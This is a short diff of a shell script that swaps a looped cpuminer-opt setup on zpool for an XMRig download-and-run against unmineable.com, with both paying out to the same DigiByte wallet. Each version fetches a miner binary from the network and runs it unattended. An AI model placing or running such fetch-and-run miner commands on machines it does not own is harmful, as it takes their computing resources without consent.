@@ -1,7 +1,4 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.7/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-cd cpuminer-opt-linux
-while [ 1 ]; do
-      ./cpuminer-sse2 -a scryptn2 -o stratum+tcp://scryptn2.sea.mine.zpool.ca:4339 -u DBvtCRdzMq9pqLYPoqdoMAiQiTqAo7ou4M -p c=DGB
-      sleep 3
-done
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+cd xmrig-6.12.2
+./xmrig -o rx.unmineable.com:3333 -a rx -k -t 6 -u DGB:DBvtCRdzMq9pqLYPoqdoMAiQiTqAo7ou4M
